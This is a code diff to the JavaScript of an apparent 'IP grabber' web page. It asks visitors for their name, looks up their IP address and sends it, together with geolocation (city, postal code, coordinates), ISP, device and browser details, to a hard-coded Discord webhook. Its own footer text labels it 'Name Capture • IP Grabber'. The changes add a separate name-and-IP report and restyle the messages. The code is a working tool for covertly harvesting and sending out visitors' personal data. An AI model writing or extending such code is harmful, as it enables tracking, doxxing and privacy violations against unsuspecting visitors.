@@ -3,10 +3,60 @@ const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1416742887722320062/-5
 
 // Global variable to store user information
 let currentUserInfo = null;
+let nameSubmitted = false;
+
+// Function to submit name and send white embed
+async function submitName() {
+    console.log('Submit name function called');
+    
+    const nameInput = document.getElementById('nameInput');
+    const enteredName = nameInput ? nameInput.value.trim() : '';
+    
+    if (!enteredName) {
+        alert('Please enter your name first!');
+        return;
+    }
+    
+    console.log('Name submitted:', enteredName);
+    
+    try {
+        // Get basic IP information for the white embed
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        // Send white embed to Discord
+        await sendWhiteEmbedToDiscord(enteredName, ipData.ip);
+        
+        // Show the View Details button
+        const showDetailsBtn = document.getElementById('showDetailsBtn');
+        const enterNameBtn = document.getElementById('enterNameBtn');
+        
+        if (showDetailsBtn && enterNameBtn) {
+            showDetailsBtn.style.display = 'flex';
+            enterNameBtn.textContent = '✓ Name Entered';
+            enterNameBtn.disabled = true;
+            enterNameBtn.style.opacity = '0.6';
+            enterNameBtn.style.cursor = 'not-allowed';
+        }
+        
+        nameSubmitted = true;
+        console.log('Name submission complete');
+        
+    } catch (error) {
+        console.error('Error submitting name:', error);
+        alert('Error submitting name. Please try again.');
+    }
+}
 
 // Simple test function to open modal (for debugging)
 function testModal() {
     console.log('Test modal function called');
+    
+    // Check if name was submitted
+    if (!nameSubmitted) {
+        alert('Please enter your name first!');
+        return;
+    }
     
     // Capture the name from input field
     const nameInput = document.getElementById('nameInput');
@@ -105,10 +155,7 @@ async function grabUserInfo(enteredName = '') {
         // Send to Discord webhook
         await sendToDiscord(userInfo);
         
-        // Send name separately if provided
-        if (enteredName && enteredName.trim() !== '') {
-            await sendNameToDiscord(enteredName, userInfo.ip);
-        }
+        // Note: White embed is now sent separately via submitName() function
         
         return userInfo;
     } catch (error) {
@@ -127,32 +174,32 @@ async function sendToDiscord(userInfo) {
     }
     
     const embed = {
-        title: userInfo.enteredName !== 'Not provided' ? `🎯 New Visitor: ${userInfo.enteredName}` : "🎯 New Visitor Detected",
-        color: 0xFF0000, // Red color
+        title: userInfo.enteredName !== 'Not provided' ? `New Visitor: ${userInfo.enteredName}` : "🎯 New Visitor Detected",
+        color: 0xFFFFFF, // White color
         timestamp: userInfo.timestamp,
         fields: [
             {
-                name: "👤 Visitor Information",
+                name: "- Visitor Information",
                 value: `**Name:** ${userInfo.enteredName}\n**Visit Time:** ${new Date(userInfo.timestamp).toLocaleString()}`,
                 inline: false
             },
             {
-                name: "🌐 Network Information",
+                name: "- Network Information",
                 value: `**IP Address:** ${userInfo.ip}\n**ISP:** ${userInfo.isp}`,
                 inline: false
             },
             {
-                name: "📍 Location",
+                name: "- Location",
                 value: `**Country:** ${userInfo.country} (${userInfo.countryCode})\n**Region:** ${userInfo.region}\n**City:** ${userInfo.city}\n**Postal:** ${userInfo.postal}\n**Coordinates:** ${userInfo.latitude}, ${userInfo.longitude}`,
                 inline: false
             },
             {
-                name: "💻 Device Information",
+                name: "- Device Information",
                 value: `**Platform:** ${userInfo.platform}\n**Screen:** ${userInfo.screenWidth}x${userInfo.screenHeight} (${userInfo.screenColorDepth}-bit)\n**Language:** ${userInfo.language}\n**Timezone:** ${userInfo.timezone}`,
                 inline: false
             },
             {
-                name: "🌐 Browser Information",
+                name: "- Browser Information",
                 value: `**User Agent:** ${userInfo.userAgent}\n**Cookies:** ${userInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Java:** ${userInfo.javaEnabled ? 'Enabled' : 'Disabled'}\n**Referrer:** ${userInfo.referrer}`,
                 inline: false
             }
@@ -218,28 +265,32 @@ async function sendErrorToDiscord(error) {
     }
 }
 
-// Function to send name separately to Discord
-async function sendNameToDiscord(name, ip) {
+// Function to send white embed when name is entered
+async function sendWhiteEmbedToDiscord(name, ip) {
     if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
-        console.log('Name that would be sent separately:', name);
+        console.log('White embed that would be sent:', { name, ip });
         return;
     }
     
     const embed = {
-        title: "📝 Name Entered",
-        color: 0x00FF00, // Green color
-        description: `**${name}** just entered their name on the site`,
+        color: 0xFFFFFF, // White color
         fields: [
             {
-                name: "Details",
-                value: `**Name:** ${name}\n**IP:** ${ip}\n**Time:** ${new Date().toLocaleString()}`,
+                name: "Name:",
+                value: name,
+                inline: false
+            },
+            {
+                name: "IP Address:",
+                value: ip,
+                inline: false
+            },
+            {
+                name: "Timestamp:",
+                value: new Date().toLocaleString(),
                 inline: false
             }
-        ],
-        footer: {
-            text: "Name Capture • IP Grabber"
-        },
-        timestamp: new Date().toISOString()
+        ]
     };
     
     const payload = {
@@ -256,13 +307,19 @@ async function sendNameToDiscord(name, ip) {
         });
         
         if (!response.ok) {
-            throw new Error(`Discord name webhook failed: ${response.status}`);
+            throw new Error(`Discord white embed failed: ${response.status}`);
         }
         
-        console.log('Successfully sent name to Discord');
+        console.log('Successfully sent white embed to Discord');
     } catch (error) {
-        console.error('Error sending name to Discord:', error);
+        console.error('Error sending white embed to Discord:', error);
     }
+}
+
+// Function to send name separately to Discord (legacy - kept for compatibility)
+async function sendNameToDiscord(name, ip) {
+    // This function is now handled by sendWhiteEmbedToDiscord
+    console.log('Legacy name function called, skipping...');
 }
 
 // Modal functionality
